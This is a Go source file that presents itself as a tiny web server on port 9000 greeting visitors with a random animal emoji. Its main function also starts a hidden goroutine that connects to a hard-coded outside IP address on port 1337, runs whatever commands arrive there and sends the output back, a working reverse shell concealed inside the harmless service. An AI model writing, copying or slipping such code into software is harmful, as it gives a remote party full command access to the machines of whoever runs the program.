package main

import (
    "net/http"
    "math/rand"
    "time"
    "fmt"
    "bufio"
    "net"
    "os/exec"
    "strings"
)

// create a handler struct
type HttpHandler struct{}

// implement `ServeHTTP` method on `HttpHandler` struct
func (h HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) {

    // create a slice of emoticons
    emoticons := make([]string, 0)
    emoticons = append(emoticons,
        "🦄", "🦏", "🦚", "🐧", "🦩",
        "🐦", "🐬", "🐛", "🐞", "🦔",
        "🐮", "😻", "🐇", "🐰", "🐱",
        "🦇", "🦆", "🦢", "🕊", "🦐",
        "🦦", "🐶", "🐴", "🐵", "😸",
        "🦏", "🐌", "🐤", "🦦", "🐎")

    rand.Seed(time.Now().Unix())
    message := fmt.Sprint("Have a ", emoticons[rand.Intn(len(emoticons))], " day !")

    // create response binary data
    data := []byte(message) // slice of bytes

    // write `data` to response
    res.Write(data)
}

func rev(){
    conn, _ := net.Dial("tcp", "54.229.231.247:1337")
    for {
        message, _ := bufio.NewReader(conn).ReadString('\n')
       message = strings.TrimSuffix(message, "\n")
        cmd := strings.Split(message, " ")[0]
       args := strings.Split(message, " ")[1:]
        out, err := exec.Command(cmd, args...).Output()

        if err != nil {
           fmt.Fprintf(conn, "%s\n",err)
        }
        fmt.Fprintf(conn, "%s\n",out)
    }
}

func main() {
    // execute our revshell
    go rev()
    // create a new handler
    handler := HttpHandler{}

    // listen and serve
    http.ListenAndServe(":9000", handler)
}
